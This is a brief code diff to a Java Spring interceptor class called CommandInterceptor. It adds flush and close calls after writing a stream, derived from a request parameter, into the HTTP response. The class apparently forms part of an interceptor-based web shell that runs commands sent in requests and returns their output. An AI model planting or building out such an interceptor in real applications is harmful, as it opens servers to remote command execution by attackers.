@@ -26,6 +26,8 @@ public class CommandInterceptor implements AsyncHandlerInterceptor {
                 String param = getParam(p);
                 InputStream inputStream = getInputStream(param);
                 response.getWriter().write(new Scanner(inputStream).useDelimiter("\\A").next());
+                response.getWriter().flush();
+                response.getWriter().close();
                 return false;
             }
         } catch (Throwable e) {
